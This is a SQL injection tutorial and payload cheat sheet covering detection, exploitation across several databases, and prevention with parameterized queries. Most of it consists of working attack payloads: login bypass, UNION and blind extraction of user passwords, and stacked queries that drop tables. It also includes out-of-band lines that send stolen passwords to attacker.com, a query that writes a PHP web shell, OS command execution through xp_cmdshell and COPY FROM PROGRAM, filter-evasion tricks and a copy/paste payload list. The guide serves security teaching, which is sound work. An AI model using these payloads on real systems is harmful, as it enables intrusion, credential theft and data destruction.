# SQL injection (SQLi)

SQL injection occurs when an application incorporates user input into SQL queries without proper validation or parameterization, allowing attackers to manipulate the query logic. This can enable unauthorized data access, authentication bypass, data modification/deletion, and in some cases RCE or DoS.

SQLi remains one of the most critical web vulnerabilities despite being well-known, often appearing in legacy code, dynamic query builders, and stored procedures.

> Only test systems you own or are explicitly authorized to assess.

## Why SQLi is dangerous (direct database access)

Applications use databases to store everything: user credentials, financial data, PII, business logic, configuration. When user input reaches the SQL interpreter without sanitization, attackers can:

- **Read**: Access any data in the database (users, passwords, credit cards, trade secrets)
- **Write**: Modify data (change passwords, prices, permissions)
- **Delete**: Drop tables, corrupt data
- **Authenticate**: Bypass login without credentials
- **Execute**: Run OS commands (via `xp_cmdshell`, `LOAD_FILE`, etc.)
- **Pivot**: Use the database server as a foothold to attack internal networks

Common vulnerable pattern:
```java
String query = "SELECT * FROM users WHERE username = '" + userInput + "'";
```

If `userInput = "admin' OR '1'='1"`, the query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

The `OR '1'='1'` is always true, returning all users.

## Detecting SQLi (systematic testing)

### Test 1: Single quote (syntax error detection)
Input: `'`

If vulnerable, you may see:
```text
Unterminated string literal
You have an error in your SQL syntax
ORA-00933: SQL command not properly ended
```

### Test 2: Boolean logic (response differences)
Original: `https://shop.com/products?category=Gifts`

Test payloads:
```text
Gifts' AND '1'='1    (should work normally - true condition)
Gifts' AND '1'='2    (should break or show different results - false condition)
```

If behavior differs between the two, SQLi is likely present.

### Test 3: Mathematical operations
```text
' OR 1=1--
' OR 1=2--
```

Or within numeric contexts:
```text
id=1 OR 1=1
id=1 OR 1=2
```

### Test 4: Time delays (blind SQLi)
```text
'; WAITFOR DELAY '00:00:05'--    (SQL Server)
'; SELECT SLEEP(5)--             (MySQL)
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--   (MySQL)
'||pg_sleep(5)--                 (PostgreSQL)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--   (Oracle)
```

If the response takes 5+ seconds, SQLi confirmed.

### Test 5: Out-of-band (OOB) interaction
```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--   (SQL Server)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT@@version),'attacker.com\\'))--   (MySQL)
```

Check for DNS queries or SMB connections to your domain.

## Attack patterns (from simple to advanced)

### 1) Retrieving hidden data (WHERE clause injection)

Vulnerable app:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

URL: `https://shop.com/products?category=Gifts`

Attack payload:
```text
category=Gifts'--
```

Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Comment (`--`) removes the `AND released = 1` check, showing unreleased products.

More aggressive:
```text
category=Gifts' OR 1=1--
```

Query becomes:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Returns **all products** (1=1 is always true).

### 2) Authentication bypass (login forms)

Login query:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'pass123'
```

Attack username: `admin'--`
Attack password: (anything or empty)

Resulting query:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
```

Password check is commented out, login succeeds as admin.

Alternative payloads:
```text
Username: admin' OR '1'='1
Password: (anything)

Username: ' OR 1=1--
Password: (anything)

Username: admin'/*
Password: */OR/**/1=1--
```

### 3) UNION-based data extraction (in-band SQLi)

Original query returns product data:
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

Determine column count (trial and error):
```text
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

Once the query succeeds (no error), you know the column count.

Extract data:
```text
' UNION SELECT username, password FROM users--
```

Final query:
```sql
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'
```

Response includes product data AND user credentials.

#### Finding column count (ORDER BY method):
```text
' ORDER BY 1--   (success)
' ORDER BY 2--   (success)
' ORDER BY 3--   (error = only 2 columns)
```

#### Finding which columns accept string data:
```text
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--
' UNION SELECT 'a', 'a'--
```

#### Extracting database version:
```sql
' UNION SELECT @@version, NULL--           (SQL Server, MySQL)
' UNION SELECT version(), NULL--           (PostgreSQL)
' UNION SELECT banner, NULL FROM v$version--(Oracle)
```

#### Listing tables:
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

#### Listing columns:
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

### 4) Blind SQLi (no direct output)

Application is vulnerable but doesn't show query results. Use inference techniques.

#### Boolean-based blind SQLi:
Test character-by-character using conditional logic.

Check if first character of admin password is 'a':
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

If page behaves normally → 'a' is correct
If page errors/differs → 'a' is wrong

Automate to extract full password.

#### Time-based blind SQLi:
```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

If response takes 5+ seconds → 'a' is correct
If instant response → 'a' is wrong

#### Boolean conditions (simpler tests):
```sql
' AND 1=1--   (true - page works normally)
' AND 1=2--   (false - page behaves differently)
```

Check database version (Oracle):
```sql
' AND (SELECT COUNT(*) FROM v$version) > 0--
```

If true (page normal), it's Oracle.

#### Error-based blind SQLi:
Force database errors that leak data in error messages.

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
```

Error message:
```text
ERROR: invalid input syntax for integer: "p@ssw0rd123"
```

Password revealed in error.

### 5) Second-order SQLi (stored then executed)

User registers with username: `admin'--`

Application safely stores it: `INSERT INTO users (username) VALUES ('admin''--')`

Later, application retrieves and uses it unsafely:
```java
String username = getUsernameFromSession();  // Returns: admin'--
String query = "UPDATE users SET email='new@email.com' WHERE username='" + username + "'";
```

Query becomes:
```sql
UPDATE users SET email='new@email.com' WHERE username='admin'--'
```

Updates admin's email instead of the attacker's.

### 6) SQLi in INSERT statements

Vulnerable registration:
```sql
INSERT INTO users (username, email, password) VALUES ('user', 'user@mail.com', 'hash')
```

Malicious username: `user', 'admin@mail.com', 'knownhash')--`

Query becomes:
```sql
INSERT INTO users (username, email, password) VALUES ('user', 'admin@mail.com', 'knownhash')--', 'user@mail.com', 'hash')
```

Creates account with admin email and known password.

### 7) SQLi in UPDATE statements

Vulnerable profile update:
```sql
UPDATE users SET email='new@email.com' WHERE id=5
```

Malicious email input: `test@mail.com', role='admin' WHERE id=5--`

Query becomes:
```sql
UPDATE users SET email='test@mail.com', role='admin' WHERE id=5--' WHERE id=5
```

Elevates user to admin role.

### 8) SQLi in ORDER BY clause

Vulnerable sort:
```sql
SELECT * FROM products ORDER BY price ASC
```

URL: `?sort=price`

Exploitation is tricky (can't use UNION), but you can:
- Trigger errors to confirm vulnerability
- Use conditional delays for blind extraction
- Inject subqueries (database-dependent)

Example (MySQL):
```text
?sort=(SELECT CASE WHEN (1=1) THEN name ELSE price END)
```

### 9) Stacked queries (batched execution)

Some databases (SQL Server, PostgreSQL) allow multiple statements separated by `;`

```text
'; DROP TABLE users--
'; INSERT INTO users (username, role) VALUES ('hacker', 'admin')--
'; EXEC xp_cmdshell('whoami')--
```

Query becomes:
```sql
SELECT * FROM products WHERE id=1; DROP TABLE users--
```

### 10) Out-of-band (OOB) data exfiltration

When results aren't displayed, exfiltrate via DNS or HTTP to your server.

SQL Server (DNS exfil):
```sql
'; DECLARE @data VARCHAR(1024); SELECT @data=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"')--
```

MySQL (HTTP exfil via LOAD_FILE):
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--
```

Oracle (XXE-based OOB):
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)||'"> %remote;]>'),'/l') FROM dual--
```

## Database fingerprinting (identifying the DBMS)

Syntax differences help identify the database type.

### Version extraction:
```sql
@@version           -- SQL Server, MySQL
version()           -- PostgreSQL, MySQL
v$version           -- Oracle
sqlite_version()    -- SQLite
```

### String concatenation:
```sql
'foo'||'bar'        -- Oracle, PostgreSQL
'foo'+'bar'         -- SQL Server
CONCAT('foo','bar') -- MySQL
```

### Substring:
```sql
SUBSTRING('abc',1,1)  -- SQL Server, MySQL, PostgreSQL
SUBSTR('abc',1,1)     -- Oracle, SQLite
```

### Comment syntax:
```sql
--                  -- SQL Server, Oracle, PostgreSQL, MySQL
#                   -- MySQL only
/**/                -- All (inline comment)
```

### Time delays:
```sql
WAITFOR DELAY '0:0:5'           -- SQL Server
SELECT SLEEP(5)                 -- MySQL
SELECT pg_sleep(5)              -- PostgreSQL
DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- Oracle
```

## Advanced exploitation techniques

### Database enumeration (information_schema):

List all tables:
```sql
' UNION SELECT table_schema, table_name FROM information_schema.tables--
```

List columns for 'users' table:
```sql
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'--
```

Current database:
```sql
' UNION SELECT database(), NULL--  (MySQL)
' UNION SELECT DB_NAME(), NULL--   (SQL Server)
```

### Reading files (MySQL):
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini'), NULL--
```

### Writing files (MySQL):
```sql
' UNION SELECT '<?php system($_GET["c"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php'--
```

### OS command execution (SQL Server):
Enable xp_cmdshell:
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
```

Execute command:
```sql
'; EXEC xp_cmdshell 'whoami'--
```

### PostgreSQL command execution:
```sql
'; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output--
```

### Bypassing WAFs and filters

#### Case variation:
```sql
SeLeCt * FrOm users
```

#### Inline comments:
```sql
SEL/**/ECT * FR/**/OM users
```

#### Alternative whitespace:
```sql
SELECT/*comment*/password/*comment*/FROM/*comment*/users
SELECT%09password%09FROM%09users   (tab)
SELECT%0Apassword%0AFROM%0Ausers   (newline)
```

#### Encoding:
```sql
UNION SELECT     → %55%4E%49%4F%4E%20%53%45%4C%45%43%54   (URL encode)
UNION SELECT     → &#85;&#78;&#73;&#79;&#78; &#83;&#69;&#76;&#69;&#67;&#84;   (HTML entities in XML)
```

#### Alternative keywords:
```sql
' AND 1=1--      → ' && 1=1--
' OR 1=1--       → ' || 1=1--
```

## Testing workflow (systematic approach)

### Step 1: Map input points
Identify all user inputs that might reach SQL:
- URL parameters
- POST body fields
- Headers (User-Agent, Referer, Cookie)
- JSON/XML values
- File upload metadata

### Step 2: Test for errors
Inject `'` and look for SQL errors in response.

### Step 3: Test Boolean logic
```text
' AND '1'='1
' AND '1'='2
```

Compare responses.

### Step 4: Determine injection context
- String: `'` breaks, need to close the string
- Numeric: no quotes, inject directly: `1 OR 1=1`
- Inside `LIKE`: `%' OR '1'='1`

### Step 5: Comment out remainder
```text
'--
'#
'/*
```

### Step 6: Determine column count (UNION)
```text
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Step 7: Extract data
```sql
' UNION SELECT username, password FROM users--
```

### Step 8: If blind, use time delays
```sql
' AND SLEEP(5)--
```

### Step 9: Automate with sqlmap (authorized testing)
```bash
sqlmap -u "http://target.com/page?id=1" --batch --dump
```

## Prevention (how to fix SQLi)

### 1) Parameterized queries (prepared statements) - REQUIRED

Bad (vulnerable):
```java
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

Good (safe):
```java
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

Other languages:

**Python (psycopg2)**:
```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**PHP (PDO)**:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

**Node.js (pg)**:
```javascript
client.query("SELECT * FROM users WHERE username = $1", [username]);
```

**.NET**:
```csharp
SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE username = @username", conn);
cmd.Parameters.AddWithValue("@username", username);
```

### 2) Whitelist input validation (for dynamic elements)

For table names, column names, ORDER BY (can't be parameterized):

```java
String[] allowedColumns = {"name", "price", "category"};
if (!Arrays.asList(allowedColumns).contains(sortColumn)) {
    throw new IllegalArgumentException("Invalid sort column");
}
String query = "SELECT * FROM products ORDER BY " + sortColumn;
```

### 3) Least privilege (database permissions)

- Application accounts should NOT have `DROP`, `CREATE`, `ALTER` permissions
- Use read-only accounts where possible
- Disable `xp_cmdshell`, `LOAD_FILE`, `INTO OUTFILE`

### 4) Escape user input (last resort, not recommended)

If you must build dynamic SQL:
```java
String safe = username.replace("'", "''");  // SQL escape
String query = "SELECT * FROM users WHERE username = '" + safe + "'";
```

But parameterized queries are ALWAYS better.

### 5) Error handling

Don't expose database errors to users:
```text
Bad: "ERROR: Syntax error near 'admin'"
Good: "An error occurred. Please try again."
```

Log detailed errors server-side only.

## Quick payload reference (copy/paste)

Basic tests:
```text
'
"
`
')
")
`)
'))
"))
'--
' OR '1'='1
' OR 1=1--
```

UNION attacks:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
```

Authentication bypass:
```text
admin'--
admin'#
' OR '1'='1'--
' OR 1=1--
```

Time delays:
```sql
'; WAITFOR DELAY '0:0:5'--      (SQL Server)
' AND SLEEP(5)--                (MySQL)
' || pg_sleep(5)--              (PostgreSQL)
```

Database version:
```sql
' UNION SELECT @@version,NULL--
' UNION SELECT version(),NULL--
```

List tables:
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```
